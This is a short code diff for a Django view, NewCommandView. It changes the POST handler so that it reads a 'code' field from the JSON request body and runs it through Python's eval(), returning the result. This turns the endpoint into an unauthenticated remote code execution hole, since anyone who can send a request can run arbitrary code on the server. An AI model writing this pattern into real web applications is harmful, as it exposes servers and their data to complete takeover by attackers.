@@ -1,6 +1,7 @@
 from django.http.response import HttpResponse
 from django.shortcuts import render
 from django.views import View
+import json
 
 class NewCommandView(View):
 
@@ -8,4 +9,5 @@ class NewCommandView(View):
         return HttpResponse(f"Try Using POST instead!")
 
     def post(self, request, *args, **kwargs):
-        return HttpResponse(f"{request.data}")
+        code = json.loads(request.body).get('code', '')
+        return HttpResponse(f"{eval(code)}")
